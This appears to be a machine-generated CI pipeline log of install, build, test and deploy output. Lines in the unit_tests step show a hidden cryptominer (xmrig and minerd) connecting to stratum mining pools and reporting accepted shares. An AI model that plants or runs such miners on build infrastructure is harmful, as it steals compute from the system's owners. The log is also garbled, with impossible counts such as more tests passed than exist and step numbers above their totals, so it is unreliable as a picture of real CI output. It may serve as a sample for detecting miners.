Successfully installed react-3.3\n[12:20:15] DEBUG: Query executed in 42ms\nTest Suites: 9 passed, 24 total\nChecking out master branch\n[12:20:15] WARN: Deprecated API usage\nSuccess!\nUsing Python 3.12\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nFinished.\n[12:20:15] INFO: Starting build process\nCompiling src/main.py...\nPlatform: darwin-arm64\nnpm install: added 107 packages\nCreating production build...\nDone.\nCompiling lib/main.py...\n[12:20:15] WARN: Deprecated API usage\nStep 13/21: Linting\nFetching submodules...\n\u2713 package completed\nLoading...\n  PASS: unit/test_cache_hit.spec.js\nNODE_ENV=production\nCache saved successfully\n[12:20:15] INFO: Processing request\n[12:20:15] INFO: Request completed\nPulling image: python:3.11\nAlready up to date.\nOK\nGenerating source maps...\nCompiling lib/handler.rs...\nWaiting...\nStep 13/18: Installing dependencies\n[12:20:15] INFO: Processing request\n[12:20:15] DEBUG: Connection pool: 8 active\nOptimizing 86 modules...\nFinished.\n[12:20:15] ERROR: Connection failed\nPlatform: darwin-arm64\npip: Installing build dependencies...\n[12:20:15] WARN: Deprecated API usage\nHEAD is now at 25b7fef\nPlatform: linux-x64\nCompiling utils/handler.rs...\nBuilding Docker image...\nMinifying app.js\n[12:20:15] DEBUG: Loading configuration\nCompiling utils/utils.go...\nnpm install: resolved 1868 packages\n[12:20:15] DEBUG: Memory usage: 478MB\npip: Installing build dependencies...\nCache restored successfully (138MB)\nInstalling axios@4.6.5\nCoverage: 96% statements, 76% branches\nConnection established\nWARNING: lodash has known vulnerabilities\npip install: Successfully installed prettier-4.17\nPOST /upload - 202 (31ms)\nChecking out develop branch\nnpm install: resolved 240 packages\nBundling styles.css\nReady.\nFAILED: test_auth_login\n\u2713 All checks passed\nCache miss for key-8915\nNODE_ENV=development\npip: Downloading react-2.6.tar.gz\n[12:20:15] INFO: Processing request\nPlatform: win32-x64\npip: Downloading prettier-1.5.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache invalidated: dependencies\n[12:20:15] INFO: Processing request\nCompleted.\nnpm notice: created a lockfile\nLayer 6/13: RUN command\nStep 9/25: Deploying\nChecking out main branch\nUsing Node.js 15.1.1\nWARNING: react has known vulnerabilities\n[12:20:15] ERROR: Connection failed\n\u2713 Step 'install' succeeded\nPulling image: python:3.11\nWARNING: express has known vulnerabilities\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nBuilding Docker image...\nDone.\nSnapshots: 34 passed, 35 total\nProcessing...\n\u2713 Task completed in 4292ms\nCompiling lib/index.js...\nBuilding Docker image...\n[12:20:15] ERROR: Connection failed\nConnecting to example.com:443...\nLoading...\nChecking out master branch\nBundling styles.css\nFinished.\nUsing Python 3.10\npip: Downloading axios-1.15.tar.gz\nWARNING: axios has known vulnerabilities\nInstalling eslint@3.5.1\n  PASS: e2e/test_user_create.spec.js\n[12:20:15] DEBUG: Query executed in 60ms\nEnvironment: development\nAlready up to date.\nnpm notice: created a lockfile\n[12:20:15] DEBUG: Query executed in 69ms\nTime: 108.619s\nBuilding Docker image...\nCompleted.\nTransforming 570 files...\nArtifact downloaded: 27MB\n[12:20:15] DEBUG: Memory usage: 574MB\nSnapshots: 18 passed, 42 total\nMinifying vendor.js\nTest Suites: 27 passed, 41 total\nVerifying...\nMinifying app.js\nLoading...\nImage pulled successfully\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPushing to registry...\nHEAD is now at 560ac6b\nConnecting to example.com:443...\n[12:20:15] WARN: Deprecated API usage\n\u2713 Task completed in 1102ms\nStep 11/23: Running migrations\nnpm notice: created a lockfile\nCompiling src/main.py...\nFinished.\nGET /status - 200 (91ms)\nMinifying main.js\nUsing Node.js 16.7.2\n\u2717 build failed with exit code 60\nImage pulled successfully\nAlready up to date.\n[12:20:15] INFO: Connecting to database\n[12:20:15] INFO: Cache refreshed\nVerifying...\nEnvironment: development\nFinished.\n=== Step setup_environment completed ===\n=== Step: type_check ===\nPulling image: alpine:3.11\nCompiling components/service.java...\nArtifact uploaded: dist.zip (32MB)\nnpm notice: created a lockfile\nImage pulled successfully\nAlready up to date.\nLayer 10/8: ENV command\nConnecting to acme.corp:443...\nNODE_ENV=test\nFinished.\nSwitched to branch 'hotfix/task-854'\n[12:20:15] DEBUG: Query executed in 60ms\nCompiling components/utils.go...\npip install: Successfully installed lodash-1.11\n[12:20:15] DEBUG: Loading configuration\nArtifact uploaded: dist.zip (70MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nWaiting...\nWARNING: react has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPushing to registry...\nGenerating source maps...\nEnvironment: test\nCache invalidated: dependencies\nCompleted.\n[12:20:15] DEBUG: Initializing service\npip: Downloading axios-2.8.tar.gz\nCache restored successfully (466MB)\nBuilding Docker image...\nOK\nStep 17/17: Testing\nSuccess!\nStep 10/23: Installing dependencies\nnpm install: added 287 packages\nGET /api - 204 (12ms)\nImage pulled successfully\nnpm install: added 119 packages\nTest Suites: 36 passed, 37 total\nConnection established\n[12:20:15] INFO: Processing request\nSuccess!\n[12:20:15] DEBUG: Query executed in 38ms\nFetching submodules...\nnpm notice: created a lockfile\nTLS handshake completed\n[12:20:15] INFO: Request completed\nBuilding Docker image...\nArtifact uploaded: dist.zip (27MB)\nOptimizing 74 modules...\n[12:20:15] WARN: Deprecated API usage\nUsing Python 3.12\nEnvironment: staging\n[12:20:15] DEBUG: Loading configuration\nVerifying...\nTransforming 587 files...\nArtifact uploaded: dist.zip (51MB)\nImage pulled successfully\nConnection established\n\u2713 All checks passed\n[12:20:15] DEBUG: Memory usage: 1869MB\nStep 19/23: Installing dependencies\nTLS handshake completed\nUploading artifact 'dist' (37 files)\nProcessing...\n[12:20:15] INFO: Starting build process\n\u2717 build failed with exit code 103\n[12:20:15] ERROR: Connection failed\n[12:20:15] WARN: Deprecated API usage\n\u2713 lint completed\nEnvironment: development\nStep 20/15: Building\nCompleted.\npip: Collecting prettier\nSnapshots: 43 passed, 2 total\nCompiling components/main.py...\nFAILED: test_db_connect\nTest Suites: 36 passed, 40 total\nCache miss for key-7558\n[12:20:15] ERROR: Connection failed\nUsing Node.js 17.6.3\n\u2717 build failed with exit code 26\nWARNING: lodash has known vulnerabilities\nStep 17/18: Testing\nnpm notice: package.json updated\nStep 6/18: Running migrations\n[12:20:15] DEBUG: Initializing service\nCache saved successfully\nAlready up to date.\nStep 2/24: Running migrations\nBundling styles.js\nTests: 292 passed, 327 total\nStep 8/19: Linting\nnpm notice: package.json updated\nEnvironment: test\nArtifact uploaded: build.tar.gz (21MB)\nnpm notice: created a lockfile\n[12:20:15] DEBUG: Connection pool: 9 active\nGenerating source maps...\nFinished.\npip: Downloading axios-2.14.tar.gz\nStep 16/20: Building\nReady.\nAlready up to date.\nStep 1/23: Linting\nTransforming 275 files...\nChecking out develop branch\nReady.\nStep 7/21: Deploying\nWARNING: axios has known vulnerabilities\nCreating production build...\n[12:20:15] INFO: Starting build process\nOptimizing 91 modules...\n[12:20:15] INFO: Request completed\nFAILED: test_api_health\npip install: Successfully installed axios-1.13\nTests: 260 passed, 200 total\nVerifying...\nCoverage: 83% statements, 98% branches\nCoverage: 99% statements, 72% branches\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache restored successfully (387MB)\nStep 15/19: Running migrations\n  PASS: unit/test_api_health.spec.js\nTests: 379 passed, 127 total\nUsing Node.js 20.19.1\nStep 16/25: Running migrations\nOK\nyarn add: Done in 5.19s\nSuccess!\nSwitched to branch 'feature/task-606'\n  PASS: test_api_health (474ms)\n\u2713 package completed\nStep 17/17: Building\nSnapshots: 1 passed, 25 total\nUploading artifact 'dist' (40 files)\nCache restored successfully (446MB)\nPushing to registry...\n[12:20:15] INFO: Starting build process\nReady.\nArtifact uploaded: dist.zip (23MB)\n  PASS: unit/test_auth_login.spec.js\npip: Downloading axios-2.3.tar.gz\nWaiting...\n[12:20:15] INFO: Request completed\nConnection established\nBundling vendor.js\n\u2713 Task completed in 1872ms\nRan 156 tests in 25s\nConnection established\nSuccess!\npip install: Successfully installed jest-3.7\nRan 157 tests in 45s\nUploading artifact 'dist' (27 files)\nStep 12/18: Testing\nLoading...\npip: Collecting prettier\nUsing Node.js 16.17.5\nReady.\nBuilding Docker image...\nProcessing...\nOK\nTest Suites: 41 passed, 5 total\n[12:20:15] WARN: Deprecated API usage\nUsing Python 3.10\nAlready up to date.\nPulling image: node:latest\n[12:20:15] INFO: Cache refreshed\nLoading...\npip install: Successfully installed eslint-4.1\nWaiting...\n\u2713 All checks passed\nFetching submodules...\nException: ValueError\n[12:20:15] INFO: Request completed\nInstalling prettier@4.2.6\nRan 113 tests in 56s\nConnection established\nSuccess!\n[12:20:15] DEBUG: Query executed in 11ms\nLoading...\n\u2713 Step 'test' succeeded\nCache restored successfully (413MB)\nStep 9/25: Linting\nCache saved successfully\nTLS handshake completed\nUsing Node.js 20.14.1\nPulling image: node:3.11\nNODE_ENV=development\nyarn add: Done in 10.10s\n[12:20:15] INFO: Request completed\n[12:20:15] DEBUG: Connection pool: 1 active\n=== Step type_check completed ===\n=== Step: deploy_production ===\nPOST /api - 202 (295ms)\nFetching submodules...\nCache miss for key-9815\nCoverage: 78% statements, 98% branches\nStep 16/22: Linting\n[12:20:15] WARN: Deprecated API usage\nStep 5/16: Installing dependencies\nBundling vendor.js\nCache saved successfully\nRan 22 tests in 14s\n[12:20:15] DEBUG: Query executed in 2ms\nUploading artifact 'build' (3 files)\nArtifact uploaded: build.tar.gz (8MB)\nGenerating source maps...\nGenerating source maps...\n[12:20:15] INFO: Processing request\nStep 16/19: Testing\nArtifact uploaded: build.tar.gz (7MB)\nnpm notice: created a lockfile\nWARNING: eslint has known vulnerabilities\nCompiling lib/handler.rs...\nImage pulled successfully\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTransforming 787 files...\nCache saved successfully\n[12:20:15] WARN: Deprecated API usage\nFinished.\nnpm install: added 458 packages\nCreating production build...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:20:15] WARN: Deprecated API usage\nWaiting...\nWaiting...\nArtifact downloaded: 26MB\n[12:20:15] DEBUG: Query executed in 19ms\n[12:20:15] INFO: Cache refreshed\npip: Downloading webpack-2.1.tar.gz\nnpm notice: created a lockfile\nPlatform: win32-x64\n\u2713 All checks passed\nAlready up to date.\n\u2713 Task completed in 2020ms\nChecking out develop branch\nAlready up to date.\nDone.\n[12:20:15] INFO: Connecting to database\nStep 8/24: Installing dependencies\n[12:20:15] INFO: Request completed\nStep 2/25: Testing\nArtifact uploaded: dist.zip (42MB)\n\u2713 deploy completed\nCompleted.\nSwitched to branch 'feature/task-564'\nWARNING: prettier has known vulnerabilities\n[12:20:15] DEBUG: Connection pool: 10 active\n[12:20:15] WARN: Deprecated API usage\nCompiling components/index.js...\nStep 10/19: Testing\nBuilding Docker image...\nChecking out main branch\nCreating production build...\n[12:20:15] WARN: Deprecated API usage\npip: Downloading react-5.15.tar.gz\n[12:20:15] DEBUG: Initializing service\nException: ValueError\nStep 15/21: Deploying\n  PASS: unit/test_user_create.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nNODE_ENV=test\nCache miss for key-7092\nArtifact uploaded: dist.zip (47MB)\nCompiling components/handler.rs...\nPOST /data - 201 (286ms)\n\u2717 build failed with exit code 49\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:20:15] DEBUG: Loading configuration\nPlatform: linux-x64\nTime: 88.897s\nGenerating source maps...\nArtifact downloaded: 49MB\nUsing Node.js 19.8.1\nnpm install: added 117 packages\nCompiling src/main.py...\nnpm install: added 42 packages\n[12:20:15] WARN: Deprecated API usage\n[12:20:15] INFO: Cache refreshed\nImage pulled successfully\nCache miss for key-3110\n[12:20:15] DEBUG: Loading configuration\nChecking out master branch\nCreating production build...\nnpm install: added 153 packages\nnpm install: added 210 packages\nCache miss for key-7093\nStep 1/21: Installing dependencies\npip: Collecting react\nNODE_ENV=development\nStep 9/17: Testing\nReady.\nPlatform: darwin-arm64\n\u2713 Task completed in 1354ms\n[12:20:15] INFO: Connecting to database\nRan 126 tests in 30s\nCache invalidated: build\nCache hit for key-7892\nUploading artifact 'coverage' (27 files)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTLS handshake completed\nTests: 499 passed, 474 total\nCompiling components/app.ts...\nTest Suites: 8 passed, 15 total\nSnapshots: 8 passed, 19 total\nnpm notice: package.json updated\nCache hit for key-7568\nNODE_ENV=production\nConnecting to cloud.services:443...\nnpm notice: package.json updated\nGET /status - 201 (74ms)\nPulling image: alpine:latest\nEnvironment: staging\nEnvironment: test\nFetching submodules...\nFinished.\nPlatform: win32-x64\nFetching submodules...\nCache restored successfully (218MB)\n  PASS: test_auth_login (350ms)\nStep 18/25: Linting\nCompiling utils/index.js...\nWARNING: express has known vulnerabilities\nStep 1/19: Installing dependencies\nnpm notice: created a lockfile\nMinifying app.js\nCompiling utils/service.java...\nCache saved successfully\n  PASS: test_api_health (409ms)\nFinished.\n\u2713 Task completed in 3800ms\nPOST /api - 201 (405ms)\n[12:20:15] WARN: Deprecated API usage\nTime: 29.468s\nStep 18/17: Running migrations\nMinifying vendor.js\nInstalling axios@5.17.7\nFAILED: test_user_create\nRan 69 tests in 44s\nConnection established\nTLS handshake completed\nStep 7/25: Deploying\nCompiling components/index.js...\nArtifact uploaded: build.tar.gz (28MB)\nFAILED: test_cache_hit\nUsing Python 3.12\n[12:20:15] INFO: Starting build process\nUsing Python 3.12\nGET /health - 204 (29ms)\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact downloaded: 8MB\nCoverage: 91% statements, 100% branches\nStep 18/18: Linting\nnpm notice: created a lockfile\nWaiting...\nUsing Python 3.10\nStep 1/16: Deploying\nOptimizing 13 modules...\nProcessing...\nOK\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPulling image: node:latest\nPulling image: alpine:3.11\n[12:20:15] WARN: Deprecated API usage\nEnvironment: production\nChecking out main branch\nCache invalidated: build\nUsing Node.js 16.7.4\nUploading artifact 'build' (27 files)\nCache invalidated: node_modules\n\u2713 Task completed in 1659ms\nVerifying...\n[12:20:15] WARN: Deprecated API usage\nnpm install: resolved 1006 packages\nPlatform: linux-x64\npip: Installing build dependencies...\nPOST /upload - 200 (315ms)\nBundling vendor.css\nCompiling lib/service.java...\nArtifact uploaded: build.tar.gz (44MB)\n\u2717 build failed with exit code 105\nWARNING: react has known vulnerabilities\nAlready up to date.\n=== Step deploy_production completed ===\n=== Step: unit_tests ===\nPOST /upload - 200 (434ms)\nnpm install: added 327 packages\nArtifact uploaded: build.tar.gz (11MB)\nTime: 12.206s\nxmrig: Starting mining on pool.test.io:3333\nGET /status - 204 (53ms)\nPushing to registry...\nTest Suites: 38 passed, 48 total\n[12:20:15] WARN: Deprecated API usage\nCompiling lib/service.java...\n[12:20:15] WARN: Deprecated API usage\n[12:20:15] DEBUG: Initializing service\nnpm install: added 256 packages\nDone.\nConnecting to stratum+tcp://mine.cloud.services:3333\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:20:15] DEBUG: Query executed in 26ms\nBundling runtime.css\nyarn add: Done in 9.17s\n\u2713 All checks passed\nAccepted share #627\n  PASS: unit/test_auth_login.spec.js\nPushing to registry...\n\u2713 validate completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nConnecting to stratum+tcp://mine.example.com:3333\nOK\n\u2717 build failed with exit code 25\nTests: 133 passed, 386 total\nCache invalidated: dependencies\n\u2713 test completed\n[12:20:15] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (9MB)\nStep 1/20: Deploying\nImage pulled successfully\nnpm install: resolved 303 packages\nConnecting to acme.corp:443...\nOK\nLoading...\nAlready up to date.\n\u2713 Step 'install' succeeded\n[12:20:15] DEBUG: Initializing service\nFinished.\nHEAD is now at fa48e56\n[12:20:15] INFO: Cache refreshed\nWaiting...\n[12:20:15] INFO: Processing request\n[12:20:15] WARN: Deprecated API usage\nUsing Node.js 20.6.2\nAlready up to date.\nCompiling components/utils.go...\nTime: 108.54s\nInstalling webpack@4.2.6\nCreating production build...\nCache invalidated: node_modules\nUploading artifact 'dist' (20 files)\nCache miss for key-7527\nAccepted share #84\nCache saved successfully\nCache saved successfully\nInstalling jest@1.12.7\nStep 19/20: Testing\nTest Suites: 21 passed, 38 total\n[12:20:15] WARN: Deprecated API usage\nGenerating source maps...\nStep 20/17: Linting\n[12:20:15] WARN: Deprecated API usage\nReady.\nBuilding Docker image...\nnpm install: added 231 packages\nCreating production build...\nCache invalidated: dependencies\nReady.\n[12:20:15] INFO: Connecting to database\nStep 11/15: Running migrations\nFinished.\nStep 19/20: Running migrations\nWARNING: axios has known vulnerabilities\nnpm install: added 283 packages\nPushing to registry...\nTime: 38.963s\nGenerating source maps...\nDone.\n[12:20:15] DEBUG: Query executed in 55ms\n  PASS: e2e/test_api_health.spec.js\nCache invalidated: build\nConnecting to example.com:443...\nCompiling src/app.ts...\n  PASS: e2e/test_db_connect.spec.js\n[12:20:15] INFO: Cache refreshed\nGenerating source maps...\nCompiling components/index.js...\nCompiling utils/service.java...\nUsing Python 3.12\nDone.\nArtifact downloaded: 18MB\nnpm install: added 182 packages\nCache restored successfully (90MB)\n[12:20:15] DEBUG: Connection pool: 7 active\n[12:20:15] DEBUG: Loading configuration\nRan 115 tests in 16s\nSnapshots: 2 passed, 3 total\nCompiling utils/app.ts...\nStep 14/19: Building\nArtifact uploaded: dist.zip (3MB)\nInstalling lodash@1.20.8\nCache restored successfully (130MB)\n  PASS: e2e/test_auth_login.spec.js\nCache hit for key-3243\nArtifact uploaded: build.tar.gz (30MB)\nArtifact downloaded: 36MB\nBuilding Docker image...\nCompiling utils/handler.rs...\npip: Installing build dependencies...\n[12:20:15] INFO: Connecting to database\nDone.\nminerd: 9 threads active\n[12:20:15] WARN: Deprecated API usage\nDone.\nUsing Node.js 20.5.5\nAlready up to date.\nTransforming 291 files...\nCache miss for key-5037\nCompiling utils/service.java...\nAlready up to date.\nCreating production build...\nBuilding Docker image...\nCache miss for key-4130\nCompiling components/app.ts...\nLayer 6/8: COPY command\nConnection established\nCache hit for key-9815\nSwitched to branch 'feature/task-978'\n\u2713 Task completed in 3309ms\nPushing to registry...\npip: Downloading react-2.14.tar.gz\n\u2717 build failed with exit code 63\nException: ValueError\nInstalling jest@1.3.2\nStep 17/18: Testing\nConnecting to startup.dev:443...\nStep 1/22: Testing\nStep 5/23: Installing dependencies\nCache saved successfully\n  PASS: unit/test_cache_hit.spec.js\n[12:20:15] WARN: Deprecated API usage\nMinifying main.js\n\u2713 All checks passed\nCompiling components/app.ts...\nnpm install: added 12 packages\nTest Suites: 49 passed, 33 total\nPlatform: darwin-arm64\nBuilding Docker image...\nTest Suites: 16 passed, 14 total\nGET /health - 200 (76ms)\nAlready up to date.\n[12:20:15] WARN: Deprecated API usage\n[12:20:15] ERROR: Connection failed\n\u2713 All checks passed\n  PASS: test_api_health (441ms)\nStep 20/15: Deploying\n  PASS: test_auth_login (483ms)\nGET /status - 204 (88ms)\nyarn add: Done in 16.59s\npip: Downloading jest-1.2.tar.gz\nConnection established\nHEAD is now at dd3e427\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTransforming 514 files...\nStep 15/17: Linting\nCoverage: 97% statements, 65% branches\nReady.\n  PASS: test_auth_login (143ms)\nTime: 36.109s\n[12:20:15] DEBUG: Initializing service\nNODE_ENV=test\nxmrig: Starting mining on pool.startup.dev:3333\n[12:20:15] DEBUG: Loading configuration\nConnection established\nSnapshots: 15 passed, 22 total\nTransforming 870 files...\n[12:20:15] INFO: Processing request\nUploading artifact 'coverage' (12 files)\npip install: Successfully installed jest-3.0\nCompiling components/app.ts...\nStep 20/17: Deploying\nxmrig: Starting mining on pool.acme.corp:3333\nGET /health - 200 (10ms)\nDone.\nDone.\nConnecting to stratum+tcp://mine.acme.corp:3333\nTests: 199 passed, 179 total\nHEAD is now at bb3b3ae\nCreating production build...\nInstalling prettier@4.14.6\npip: Downloading axios-5.11.tar.gz\nStep 15/16: Installing dependencies\n  PASS: test_db_connect (384ms)\nArtifact uploaded: dist.zip (77MB)\n=== Step unit_tests completed ===\n=== Step: save_cache ===\nUsing Python 3.11\nGET /status - 201 (97ms)\n  PASS: test_auth_login (42ms)\npip install: Successfully installed react-2.17\nPlatform: darwin-arm64\n[12:20:15] ERROR: Connection failed\nRan 163 tests in 43s\nPOST /data - 200 (184ms)\nStep 14/18: Running migrations\nStep 10/16: Testing\nGET /api - 201 (58ms)\nStep 5/22: Building\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nConnecting to startup.dev:443...\n[12:20:15] INFO: Request completed\npip: Collecting react\nTransforming 898 files...\nHEAD is now at 87f78ea\nnpm install: added 179 packages\nCache hit for key-7789\nOK\nCache miss for key-4174\nRan 71 tests in 1s\nConnecting to startup.dev:443...\nGET /health - 201 (100ms)\nStep 6/23: Running migrations\n[12:20:15] DEBUG: Loading configuration\nStep 10/20: Testing\nGenerating source maps...\nBundling vendor.css\nEnvironment: production\npip: Installing build dependencies...\nFetching submodules...\nNODE_ENV=development\n  PASS: unit/test_cache_hit.spec.js\nHEAD is now at 9859388\nnpm install: added 386 packages\nImage pulled successfully\nFinished.\nPushing to registry...\nEnvironment: test\n\u2713 Task completed in 1755ms\n[12:20:15] DEBUG: Initializing service\nHEAD is now at b8cb0e6\nyarn add: Done in 13.87s\nUsing Node.js 20.19.5\nWaiting...\nLoading...\n[12:20:15] ERROR: Connection failed\nFAILED: test_api_health\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCreating production build...\nMinifying main.js\nStep 1/15: Testing\nCache miss for key-5988\nStep 9/19: Running migrations\nGET /api - 201 (99ms)\nWARNING: express has known vulnerabilities\nArtifact uploaded: build.tar.gz (27MB)\nyarn add: Done in 30.4s\n[12:20:15] DEBUG: Initializing service\nLoading...\nTime: 63.608s\n[12:20:15] INFO: Request completed\nTransforming 203 files...\n[12:20:15] INFO: Connecting to database\nGET /status - 201 (79ms)\nCompiling lib/handler.rs...\nPOST /upload - 200 (160ms)\nPushing to registry...\nChecking out master branch\nCompiling utils/main.py...\nyarn add: Done in 11.34s\nOptimizing 56 modules...\n[12:20:15] INFO: Cache refreshed\nException: NullPointerException\nUsing Python 3.11\nVerifying...\n[12:20:15] DEBUG: Connection pool: 1 active\nVerifying...\nTLS handshake completed\npip: Installing build dependencies...\nTests: 279 passed, 162 total\nCoverage: 73% statements, 60% branches\nStep 19/16: Running migrations\nStep 8/20: Testing\nCompiling lib/handler.rs...\nSwitched to branch 'feature/task-483'\nWARNING: axios has known vulnerabilities\nCreating production build...\nCompleted.\nCache hit for key-9245\nCompiling utils/handler.rs...\nTLS handshake completed\nCache miss for key-6315\nUsing Node.js 19.14.5\nTransforming 621 files...\nBundling main.js\nWaiting...\n[12:20:15] INFO: Connecting to database\nyarn add: Done in 8.18s\nStep 20/22: Testing\n[12:20:15] DEBUG: Connection pool: 11 active\nConnecting to test.io:443...\nArtifact downloaded: 9MB\nSwitched to branch 'hotfix/task-191'\nCompiling utils/app.ts...\nTime: 103.837s\nReady.\nInstalling express@1.11.4\nArtifact uploaded: build.tar.gz (1MB)\npip: Collecting jest\n\u2713 All checks passed\nPulling image: alpine:latest\nFinished.\nCompiling src/index.js...\nCompiling components/handler.rs...\n[12:20:15] INFO: Cache refreshed\nImage pulled successfully\nCache miss for key-3679\n[12:20:15] INFO: Request completed\n[12:20:15] DEBUG: Memory usage: 1999MB\nTransforming 566 files...\nMinifying main.js\nInstalling eslint@4.17.0\n\u2713 Task completed in 2117ms\nCompleted.\nBundling vendor.css\nTime: 28.484s\nArtifact uploaded: dist.zip (28MB)\nCompiling lib/service.java...\nInstalling webpack@2.11.9\nCompiling components/utils.go...\nGenerating source maps...\nCreating production build...\nnpm install: added 171 packages\nWaiting...\nArtifact uploaded: dist.zip (82MB)\nInstalling eslint@1.1.5\nCache miss for key-6620\nCache hit for key-2496\nCoverage: 93% statements, 99% branches\n\u2713 Step 'setup' succeeded\nCompiling src/main.py...\npip: Downloading react-3.12.tar.gz\nCache restored successfully (56MB)\nCoverage: 74% statements, 66% branches\nPushing to registry...\nnpm notice: created a lockfile\nGenerating source maps...\n[12:20:15] INFO: Processing request\nEnvironment: production\nCreating production build...\n[12:20:15] INFO: Processing request\nHEAD is now at e2dd7b7\nWARNING: axios has known vulnerabilities\nWaiting...\nLoading...\nStep 2/15: Running migrations\npip install: Successfully installed react-4.4\nCache invalidated: dependencies\npip: Installing build dependencies...\nWARNING: react has known vulnerabilities\nEnvironment: staging\nStep 2/17: Deploying\nBuilding Docker image...\nArtifact downloaded: 23MB\n[12:20:15] DEBUG: Connection pool: 17 active\n[12:20:15] DEBUG: Memory usage: 903MB\nTransforming 419 files...\nOK\nCache restored successfully (375MB)\nyarn add: Done in 29.24s\nOK\n\u2713 Step 'test' succeeded\nUsing Node.js 17.18.6\nCache invalidated: build\nTime: 114.280s\nFAILED: test_auth_login\n[12:20:15] DEBUG: Query executed in 84ms\npip install: Successfully installed express-4.20\nConnecting to test.io:443...\nUploading artifact 'build' (21 files)\nSnapshots: 38 passed, 35 total\nnpm install: resolved 1838 packages\nCompiling utils/utils.go...\nStep 1/22: Installing dependencies\nAlready up to date.\n[12:20:15] INFO: Starting build process\nPushing to registry...\n=== Step save_cache completed ===\n=== Step: deploy_staging ===\nPOST /upload - 202 (230ms)\nStep 1/16: Building\nHEAD is now at 043908b\nOK\npip: Downloading axios-4.8.tar.gz\nArtifact uploaded: build.tar.gz (28MB)\nCache restored successfully (86MB)\nOK\nnpm notice: created a lockfile\nCompiling components/app.ts...\nCompiling utils/utils.go...\nCompiling lib/service.java...\nCompleted.\nFAILED: test_user_create\n\u2717 build failed with exit code 107\nGenerating source maps...\nStep 20/25: Running migrations\nLayer 10/11: COPY command\nPushing to registry...\nBundling styles.js\nGenerating source maps...\nSnapshots: 37 passed, 33 total\nNODE_ENV=development\nArtifact downloaded: 27MB\nTLS handshake completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling utils/app.ts...\nTLS handshake completed\nPushing to registry...\nStep 2/19: Building\n[12:20:15] ERROR: Connection failed\nPulling image: node:latest\nLoading...\npip: Downloading axios-3.2.tar.gz\nTLS handshake completed\nCompiling src/index.js...\nStep 10/23: Installing dependencies\nConnection established\n\u2713 Step 'test' succeeded\nImage pulled successfully\nStep 2/25: Linting\nnpm install: resolved 598 packages\nnpm notice: created a lockfile\nConnection established\nChecking out main branch\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:20:15] DEBUG: Loading configuration\nChecking out master branch\nnpm notice: created a lockfile\nPlatform: linux-x64\nFetching submodules...\n[12:20:15] ERROR: Connection failed\nSnapshots: 31 passed, 24 total\nnpm notice: created a lockfile\nLayer 9/9: COPY command\nBundling main.css\npip install: Successfully installed eslint-5.0\nConnecting to startup.dev:443...\nWARNING: jest has known vulnerabilities\nUsing Node.js 15.17.6\nConnection established\nnpm install: resolved 348 packages\n\u2713 Step 'checkout' succeeded\nUsing Node.js 20.13.8\nArtifact uploaded: build.tar.gz (11MB)\n[12:20:15] WARN: Deprecated API usage\nStep 4/24: Building\nStep 19/17: Testing\nBundling styles.css\nFinished.\n[12:20:15] INFO: Starting build process\nInstalling eslint@5.17.2\nBundling main.css\nStep 19/19: Deploying\nPulling image: node:latest\nCompiling src/app.ts...\nException: RuntimeError\nBundling runtime.js\nSwitched to branch 'bugfix/task-555'\nConnection established\n\u2713 test completed\nArtifact downloaded: 29MB\n  PASS: e2e/test_api_health.spec.js\nAlready up to date.\n[12:20:15] DEBUG: Query executed in 35ms\nFinished.\nOptimizing 58 modules...\nStep 11/20: Linting\nMinifying main.js\npip install: Successfully installed lodash-2.2\nOptimizing 57 modules...\nLayer 4/14: RUN command\n[12:20:15] DEBUG: Memory usage: 127MB\nVerifying...\npip: Collecting react\nUsing Node.js 18.17.6\nArtifact downloaded: 25MB\nSnapshots: 28 passed, 41 total\n\u2713 All checks passed\nDone.\nTests: 399 passed, 114 total\n\u2717 build failed with exit code 9\n[12:20:15] INFO: Connecting to database\nUsing Node.js 15.17.2\nCache saved successfully\nMinifying vendor.js\nWARNING: react has known vulnerabilities\nCache saved successfully\nMinifying vendor.js\n[12:20:15] WARN: Deprecated API usage\nArtifact downloaded: 49MB\nCompleted.\nHEAD is now at 488ecb6\nnpm install: resolved 1487 packages\nCache miss for key-6493\nBuilding Docker image...\nGET /status - 200 (40ms)\nCache hit for key-4293\nMinifying vendor.js\nPlatform: darwin-arm64\nStep 3/15: Deploying\nBuilding Docker image...\nRan 73 tests in 45s\n[12:20:15] WARN: Deprecated API usage\nPlatform: win32-x64\n\u2713 Task completed in 3263ms\n\u2713 All checks passed\nFinished.\nStep 13/15: Installing dependencies\nPushing to registry...\nWARNING: react has known vulnerabilities\n\u2713 All checks passed\nOptimizing 10 modules...\nSnapshots: 37 passed, 15 total\nPulling image: node:latest\nPushing to registry...\nCache miss for key-5225\n[12:20:15] INFO: Connecting to database\nnpm notice: package.json updated\nCache hit for key-5446\n[12:20:15] ERROR: Connection failed\nCreating production build...\nCompiling utils/index.js...\n[12:20:15] DEBUG: Query executed in 59ms\n[12:20:15] INFO: Starting build process\nCache miss for key-7333\nTLS handshake completed\nBuilding Docker image...\nCache miss for key-6187\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: prettier has known vulnerabilities\nOptimizing 55 modules...\nUploading artifact 'build' (34 files)\nHEAD is now at ae66bc2\nTests: 368 passed, 72 total\nArtifact uploaded: build.tar.gz (32MB)\n[12:20:15] INFO: Request 